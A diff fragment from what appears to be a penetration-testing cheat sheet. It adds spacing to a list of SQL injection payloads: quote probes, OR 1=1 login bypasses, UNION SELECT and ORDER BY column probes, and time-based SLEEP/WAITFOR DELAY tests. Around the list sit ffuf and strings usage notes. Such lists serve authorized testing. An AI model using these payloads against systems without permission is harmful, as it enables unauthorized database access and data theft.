@@ -18,21 +18,37 @@ https://github.com/ffuf/ffuf
 -mc 200,301 — match only specific status codes
 
 '
+
 "
+
 ' OR '1'='1
+
 " OR "1"="1
+
 ' OR 1=1 --
+
 " OR 1=1 --
+
 ') OR ('1'='1
+
 ' UNION SELECT NULL --
+
 ' UNION SELECT NULL, NULL --
+
 ' UNION SELECT NULL, NULL, NULL --
+
 1 OR 1=1
+
 1' ORDER BY 1 --
+
 1' ORDER BY 10 --
+
 ' AND 1=1 --
+
 ' AND 1=2 --
+
 ' WAITFOR DELAY '0:0:5' --
+
 ' AND SLEEP(5) --
 
 strings -n 8 somebinary
